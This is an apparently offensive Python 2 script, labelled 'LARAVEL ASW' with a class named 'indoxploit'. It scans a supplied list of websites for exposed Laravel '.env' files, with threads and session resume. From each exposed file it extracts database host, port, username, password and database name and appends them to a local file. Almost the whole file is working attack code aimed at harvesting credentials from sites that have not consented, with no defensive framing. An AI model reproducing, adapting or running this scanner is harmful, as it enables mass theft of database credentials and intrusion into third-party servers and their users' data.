# -*- coding: utf-8 -*-
#python
import requests, os, sys
from re import findall as reg
requests.packages.urllib3.disable_warnings()
from threading import *
from threading import Thread
from ConfigParser import ConfigParser
from Queue import Queue

try:
	os.mkdir('ci')
except:
	pass
	
class Worker(Thread):
	def __init__(self, tasks):
		Thread.__init__(self)
		self.tasks = tasks
		self.daemon = True
		self.start()

	def run(self):
		while True:
			func, args, kargs = self.tasks.get()
			try: func(*args, **kargs)
			except Exception, e: print e
			self.tasks.task_done()

class ThreadPool:
	def __init__(self, num_threads):
		self.tasks = Queue(num_threads)
		for _ in range(num_threads): Worker(self.tasks)

	def add_task(self, func, *args, **kargs):
		self.tasks.put((func, args, kargs))

	def wait_completion(self):
		self.tasks.join()
		
class indoxploit:
	def get_database(self, text, url):
		try:
			if "DB_USERNAME" in text:
				if "DB_USERNAME" in text:
					method = '/.env'
					try:
						acc_host = reg('\nDB_HOST(\s+)?=(\s+)?(.*?)\n', text)[0]
					except:
						acc_host = ''
					try:
						acc_port = reg('\nDB_PORT(\s+)?=(\s+)?(.*?)\n', text)[0]
					except:
						acc_port = ''
					try:
						acc_user = reg('\nDB_USERNAME(\s+)?=(\s+)?(.*?)\n', text)[0]
					except:
						acc_user = ''
					try:
						acc_pass = reg('\nDB_PASSWORD(\s+)?=(\s+)?(.*?)\n', text)[0]
					except:
						acc_pass = ''
					try:
						acc_data = reg('\nDB_DATABASE(\s+)?=(\s+)?(.*?)\n', text)[0]
					except:
						acc_data = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nDB_HOST: '+str(acc_host[2])+'\nDB_PORT: '+str(acc_port[2])+'\nDB_USERNAME: '+str(acc_user[2])+'\nDB_PASSWORD: '+str(acc_pass[2])+'\nDB_DATABASE: '+str(acc_data[2])
				remover = str(build).replace('\r', '')
				save = open('ci/DB.txt', 'a')
				save.write(remover+'\n\n')
				save.close()
				return True
			else:
				return False
		except:
			return False
            
def printf(text):
	''.join([str(item) for item in text])
	print(text + '\n'),
	
def main(url):
	resp = False
	try:
		text = '\033[32;1m#\033[0m '+url
		headers = {'User-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
		get_source = requests.get(url+"/.env", headers=headers, timeout=5, verify=False, allow_redirects=False).text
		if "APP_KEY=" in get_source:
			resp = get_source
		else:
			get_source = requests.get(url+"/../.env", headers=headers, timeout=5, verify=False, allow_redirects=False).text
			if "APP_KEY=" in get_source:
				resp = get_source
		if resp:
			getdb = indoxploit().get_database(resp, url)
			if getdb:
				text += ' | \033[32;1mDATABASE\033[0m'
			else:
				text += ' | \033[31;1mDATABASE\033[0m'
		else:
			text += ' | \033[31;1mCan\'t get everything\033[0m'
			save = open('ci/not_vulnerable.txt','a')
			asu = str(url).replace('\r', '')
			save.write(asu+'\n')
			save.close()
	except:
		text = '\033[31;1m#\033[0m '+url
		text += ' | \033[31;1mCan\'t access sites\033[0m'
		save = open('ci/not_vulnerable.txt','a')
		asu = str(url).replace('\r', '')
		save.write(asu+'\n')
		save.close()
	printf(text)
	
if __name__ == '__main__':
	print('''
LARAVEL ASW	   \n''')
	try:
		readcfg = ConfigParser()
		readcfg.read(pid_restore)
		lists = readcfg.get('DB', 'FILES')
		numthread = readcfg.get('DB', 'THREAD')
		sessi = readcfg.get('DB', 'SESSION')
		print("log session bot found! restore session")
		print('''Using Configuration :\n\tFILES='''+lists+'''\n\tTHREAD='''+numthread+'''\n\tSESSION='''+sessi)
		tanya = raw_input("Want to contineu session ? [Y/n] ")
		if "Y" in tanya or "y" in tanya:
			lerr = open(lists).read().split("\n"+sessi)[1]
			readsplit = lerr.splitlines()
		else:
			kntl # Send Error Biar Lanjut Ke Wxception :v
	except:
		try:
			lists = sys.argv[1]
			numthread = sys.argv[2]
			readsplit = open(lists).read().splitlines()
		except:
			try:
				lists = raw_input("websitelist ? ")
				readsplit = open(lists).read().splitlines()
			except:
				print("Wrong input or list not found!")
				exit()
			try:
				numthread = raw_input("threads ? ")
			except:
				print("Wrong thread number!")
				exit()
	pool = ThreadPool(int(numthread))
	for url in readsplit:
		if "://" in url:
			url = url
		else:
			url = "http://"+url
		if url.endswith('/'):
			url = url[:-1]
		jagases = url
		try:
			pool.add_task(main, url)
		except KeyboardInterrupt:
			session = open(pid_restore, 'w')
			cfgsession = "[DB]\nFILES="+lists+"\nTHREAD="+str(numthread)+"\nSESSION="+jagases+"\n"
			session.write(cfgsession)
			session.close()
			print("CTRL+C Detect, Session saved")
			exit()
	pool.wait_completion()
	try:
		os.remove(pid_restore)
	except:
		pass